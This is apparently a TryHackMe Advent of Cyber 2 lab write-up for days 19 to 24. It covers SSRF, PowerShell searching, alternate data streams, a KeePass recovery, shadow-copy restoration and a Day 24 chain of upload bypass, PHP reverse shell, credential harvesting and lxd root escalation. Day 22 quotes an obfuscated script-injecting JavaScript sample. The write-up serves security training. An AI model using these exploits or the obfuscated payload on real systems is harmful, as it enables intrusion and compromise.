# [Advent of Cyber 2 [2020]](https://tryhackme.com/room/adventofcyber2)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 19: The Naughty or Nice List

open the webserver, we be able to see a website to search name and santa's login panel

![image](https://user-images.githubusercontent.com/90561566/225262034-d1fb0404-9b28-4040-962c-0e660188eeb5.png)

try to search for 'test', i see the url is processed with a parameter `proxy`

![image](https://user-images.githubusercontent.com/90561566/225262561-4532e0c4-82da-446a-9e6a-ff280cf0e047.png)

as the instruction, i will provide with `proxy=http%3A%2F%2Flist.hohoho.localtest.me` to see what is going on localhost

![image](https://user-images.githubusercontent.com/90561566/225263270-fafb94fa-4847-4e8c-b285-f57222151f61.png)

so, we have santa's password, it's too long wow

login with `Santa` and `Be good for goodness sake!`

![image](https://user-images.githubusercontent.com/90561566/225264802-10a469e9-d5ab-4fc5-a65e-052aaa533353.png)

here is our flag

![image](https://user-images.githubusercontent.com/90561566/225265002-66afa2c3-2b13-4b19-8c6d-52b25fe01926.png)

Answer:

![image](https://user-images.githubusercontent.com/90561566/225265093-7b2f758d-0030-4e7e-a9b9-b337946869a5.png)

## Day 20: PowershELlF to the rescue

ssh to the machine

```
ssh mceager@10.10.73.111
r0ckStar!
```

enter powershell mode

```
powershell
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/58af1623-9848-41cb-a85b-446fc70a08d1)

you can using PS or linux cmdlet are both okay

```
ls # or Get-ChildItem
cd Documents # or Set-Location Documents
ls -h # or Get-ChildItem -File -Hidden
cat elfone.txt # or Get-Content elfone.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0d3b6e29-f479-426f-bca6-fa54d8265cb1)

```
Set-Location ../Desktop
Get-ChildItem -Directory -Hidden
Set-Location elf2wo
Get-ChildItem -File
Get-Content e70smsW10Y4k.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0bce3566-9e1d-4dc7-bc58-ce67d9e1193b)

```
Get-ChildItem -Path C:\Windows -Directory -Recurse -Hidden -Filter '*3*' -ErrorAction SilentlyContinue
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/366be101-8099-4a5f-a65d-9e84c490809d)

```
Set-Location C:\Windows\System32\3lfthr3e
Get-ChildItem -File -Hidden
```

there are 2 files here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8161d9cb-8f2c-442b-900e-f437a55528e8)

count the words in first file and get 2 words

```
Get-Content 1.txt | Measure-Object -Word
(Get-Content 1.txt)[551]
(Get-Content 1.txt)[6991]
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9628cef8-fd9b-4f7f-b165-7da37a89769c)

find Elf 3 want

```
Select-String -Path 2.txt -Pattern "redryder"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3e43f6aa-ccc3-4261-b003-a654e63b0fd7)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/09a9744e-48d8-439e-8741-2432999bd6dd)

## Day 21: Time for some ELForensics

connect to the machine using Remmina

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ab6932b3-96b8-4d53-96cf-b2d3b83242da)

```
Get-ChildItem
Set-Location Documents
Get-ChildItem -File
Get-Content 'db file hash.txt'
Get-FileHash -Algorithm MD5 deebee.exe
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5a090cae-37d4-4e03-8436-490436bf3225)

find the hidden flag on exe file

```
C:\Tools\strings64.exe -accepteula .\deebee.exe | Select-String -Pattern "THM"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/28a0b985-fc61-4746-a3f0-e4ea750a984b)

run the database connector file and capture the alternate data stream

```
.\deebee.exe
Get-Item -Path deebee.exe -Stream *
wmic process call create $(Resolve-Path ./deebee.exe:hidedb)
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a3236ea0-c330-408a-b32c-c518d702d274)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee8000b6-d754-4a91-bab6-11669b6e22ed)

## Day 22: Elf McEager becomes CyberElf

log into the machine using Remmina

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d74fc61e-2ee4-453e-a14b-2ad22ed9262a)

automatic decode the folder name using Magic

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/07fc0815-d0cf-4bf3-8711-2f1d4c20365b)

run the KeePass app on that folder enter password as `thegrinchwashere`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/43870952-0f93-4920-ad63-adcab409f7e3)

on tab Network, you will see encoded pass of Elf Server

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2c9e3f22-27ee-4b92-8d22-bef240d2e9cf)

decode it using magic

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/12a5d11c-bdbb-4558-b656-99859d80b556)

do the same with ElfMail in tab Mail

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/db2275e2-e484-443b-9091-85186b8fc504)

decode it too

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/14365949-21f0-4f0b-8464-3ae8aff0c343)

from Recycle Bin, find a Elf Sysadmin

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cbb99b50-65c1-4aa1-8e9e-a1d1e12bc222)

Look at the note for us

```
eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 54, 44, 32, 49, 48, 52, 44, 32, 49, 49, 55, 44, 32, 57, 56, 44, 32, 52, 54, 44, 32, 57, 57, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 52, 55, 44, 32, 49, 48, 52, 44, 32, 49, 48, 49, 44, 32, 57, 55, 44, 32, 49, 49, 56, 44, 32, 49, 48, 49, 44, 32, 49, 49, 48, 44, 32, 49, 49, 52, 44, 32, 57, 55, 44, 32, 49, 48, 53, 44, 32, 49, 50, 50, 44, 32, 57, 55, 44, 32, 52, 55, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 52, 57, 44, 32, 52, 57, 44, 32, 49, 48, 48, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 52, 57, 44, 32, 53, 48, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 57, 57, 44, 32, 53, 50, 44, 32, 49, 48, 48, 44, 32, 53, 52, 44, 32, 53, 52, 44, 32, 53, 53, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 53, 52, 44, 32, 49, 48, 48, 44, 32, 57, 56, 44, 32, 49, 48, 50, 44, 32, 49, 48, 48, 44, 32, 53, 55, 44, 32, 57, 55, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 53, 55, 44, 32, 53, 54, 44, 32, 57, 55, 44, 32, 53, 54, 44, 32, 53, 54, 44, 32, 57, 56, 44, 32, 53, 54, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));
```

from Hint, we have the answer to decode or you can enter it to javascript console and we can get the same answer too

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/20275c8a-aa38-497f-954b-c401eb822840)

here you are

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0a52a0ae-e369-4812-b9e9-b15946bd495f)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/303f8eb5-a30b-48a4-8e7b-4a2bc86ec8e7)

## Day 23: The Grinch strikes again!

log into the machine using Remmina

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c30be665-b713-4550-94d4-fe9a81b709f7)

decypt the bitcoin address at ransomenote.txt, it's `nomorebestfestivalcompany` in base64

you can see a lot of files are encrypted by .grinch

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/dfbf2a11-3852-47b3-8978-097d692a6b5e)

open task scheduler, you will see a suspicious task

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/286b3254-32ea-4062-ade7-39da1498bb3c)

click on its task to see the location of program

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/85e2c8cc-4af5-4b60-a8fe-4cc39159ff3a)

do the same to see properties of Shadow Copy Volumn

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/54ea1a84-b400-42a5-a134-2b168402b433)

open disk management, assign a drive letter for backup disk

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1509ce96-6ce5-4e1f-b768-8e5688c12df8)

on that backup disk, turn on show hidden files, and see a confidential folder 

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fe85b459-1bbc-4d5d-93ee-6db59de55b3c)

right click and restore it by VSS

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/49fada09-fc70-44e3-ac1c-3e5702a12271)

okay, here you go, master-password before it encrypted

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/28565533-58c7-4f00-9f98-f6956f239e6e)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3c1c2ce7-1c19-4898-87a6-8daf037cf8a9)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ca4ec894-5f1d-4a7f-9dac-97e5e477f1a1)

## Day 24: The Trial Before Christmas

scan the target

```
nmap -sS -A -T4 10.10.50.209
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0393d988-cfb2-4555-9453-7eb4f00dd2ab)

gobuster the webpage

```
gobuster dir -u http://10.10.50.209:65000/ -x .php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d49c9f1e-6230-45c0-9d8a-00d288322280)

scan the folder

```
gobuster dir -u http://10.10.50.209:65000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/62482e01-6577-4677-95de-382d9d2aea47)

bypass the client-side filter using curl because there is no JS support in curl

bypass server-side filter with a double extension to upload some php code

```
curl -X POST http://10.10.50.209:65000/api/upload/ -H "Content-Type: application/json" --data '{"name":"test.png.php","file":"<?php phpinfo(); ?>"}'
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c9d6bb2e-84d3-40fc-b14d-1ef46bccc8bc)

use burp suite to intercept file and upload a php reverse shell

Ctrl+F5 and drop filter.js

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/da7df0d4-23d6-46e1-888f-a493bffc7d2d)

upload reverse.png.php (`cp /usr/share/webshells/php/php-reverse-shell.php .` and rename it)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ca86fd83-0b87-4471-b0de-6b832700cb17)

set up listener

```
nc -vlnp 1234
```

then go to `http://10.10.50.209:65000/grid/reverse.png.php`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/932ecdae-6578-49e3-a90f-41412934a273)

find web.txt

```
find / -name web.txt -type f 2>/dev/null
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a7ab3f26-dbe9-4e92-a6d7-bc26305a499e)

upgrade and stabilize shell

```
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

Review the configuration files for the webserver to find credentials

```
cat /var/www/TheGrid/includes/dbauth.php
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eaa51125-b40c-4c55-bbf0-60c9e6a35e36)

connect to the database

```
mysql -u tron -p
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/88640e0f-721f-490b-9bf8-d6cd2e5601bd)

see users table in tron

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/16244317-6773-41f3-9e95-441128b25928)

use CrackStation to crack the password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ede0b026-faaf-43fb-afa0-4522d14bd2d6)

```
su flynn
@computer@
cd ~
cat user.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a873a1eb-2dd2-451a-b9aa-5f043865d603)

you can see it's in group of lxd which can related to privilege escalate

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ce9d8f34-91d9-48b0-b44a-71c215412d8a)

```
lxc image list
lxc init Alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2b3afd70-8f77-49ec-8900-842c5449547d)

here you go!

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5a499dcb-3679-4b47-a796-a69ace7adc78)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6bd0bf2a-1ca9-4079-94a1-f1efe98d7ab4)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/aa535db0-890d-4b48-b485-24fd1ed2f2e1)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8c38b880-7cde-4a39-8e70-8fa00d5f300a)
